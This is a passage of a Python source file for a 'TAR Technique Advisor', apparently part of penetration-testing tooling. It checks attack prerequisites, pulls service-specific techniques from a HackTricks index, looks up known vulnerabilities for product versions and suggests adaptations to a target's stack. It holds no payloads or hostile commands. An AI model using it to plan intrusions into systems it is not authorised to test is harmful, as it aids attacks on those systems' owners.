                # Can't auto-verify; assume met
                met = True
            elif check.startswith('service.port=='):
                required_port = int(check.split('==')[1])
                met = required_port in ports
            elif check.startswith('has_'):
                met = check in predicates or state.get(check, False)
            elif check.startswith('no_'):
                met = check in predicates or state.get(check, True)
            elif check.startswith('port_'):
                # Port availability check (e.g., port_445_free)
                met = True  # Can't check from state alone; assume met
            elif check in predicates:
                met = True

            if not met:
                desc = p['description']
                if p['remediation']:
                    desc += f" → {p['remediation']}"
                unmet.append(desc)

        return len(unmet) == 0, unmet

    def get_service_techniques(self, port: int, product: str = "", version: str = "") -> List[dict]:
        """Get relevant techniques for a specific service from HackTricks.

        Returns list of {heading, text, source, score} from knowledge index.
        """
        return self.index.get_service_techniques(port, product, version)

    def get_version_vulns(self, product: str, version: str) -> List[dict]:
        """Search for known vulnerabilities for a product version."""
        return self.index.get_version_vulns(product, version)


# ── Singleton ──
_advisor = None

def get_advisor() -> TechniqueAdvisor:
    global _advisor
    if _advisor is None:
        _advisor = TechniqueAdvisor()
    return _advisor


def main():
    import argparse
    parser = argparse.ArgumentParser(description="TAR Technique Advisor")
    sub = parser.add_subparsers(dest='command')

    # prerequisites
    pp = sub.add_parser('prerequisites', help='Get prerequisites for a technique')
    pp.add_argument('action', help='Action name')

    # failure
    fp = sub.add_parser('failure', help='Interpret a failure')
    fp.add_argument('action', help='Action that failed')
    fp.add_argument('error', help='Error message or output')

    # mechanism
    mp = sub.add_parser('mechanism', help='Get mechanism brief')
    mp.add_argument('action', help='Action name')

    # adapt
    ap = sub.add_parser('adapt', help='Get technique adaptations')
    ap.add_argument('action', help='Action name')
    ap.add_argument('--stack', default='', help='Technology stack (e.g., "Python Flask Jinja2")')
    ap.add_argument('--os', default='', dest='target_os', help='Target OS')

    # service
    sp = sub.add_parser('service', help='Get techniques for a service')
    sp.add_argument('port', type=int, help='Port number')
    sp.add_argument('--product', default='', help='Product name')
    sp.add_argument('--version', default='', help='Version string')

    args = parser.parse_args()
    advisor = get_advisor()

    if args.command == 'prerequisites':
        prereqs = advisor.get_prerequisites(args.action)
        if not prereqs:
            print(f"No prerequisites found for: {args.action}")
            return
        print(f"Prerequisites for {args.action}:")
        for p in prereqs:
            status = "[CHECK]" if p['check'] != 'manual' else "[MANUAL]"
            print(f"  {status} {p['description']}")
            if p['remediation']:
                print(f"         → {p['remediation']}")

    elif args.command == 'failure':
        interp = advisor.get_failure_interpretation(args.action, args.error)
        print(f"Failure interpretation for {args.action}:")
        print(f"  {interp}")

    elif args.command == 'mechanism':
        brief = advisor.get_mechanism_brief(args.action)
        if brief:
            print(brief)
        else:
            print(f"No mechanism found for: {args.action}")

    elif args.command == 'adapt':
        profile = {'tech_stack': args.stack, 'os': args.target_os}
        result = advisor.suggest_adaptation(args.action, profile)
        if not result:
            print(f"No adaptations found for: {args.action}")
            return
        import json
        print(json.dumps(result, indent=2, default=str))

    elif args.command == 'service':
        results = advisor.get_service_techniques(args.port, args.product, args.version)
        if not results:
            print(f"No techniques found for port {args.port}")
            return
        for r in results:
            print(f"\n── [{r['source']}] {r['heading']} ──")
            print(f"  {r['text'][:200]}...")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
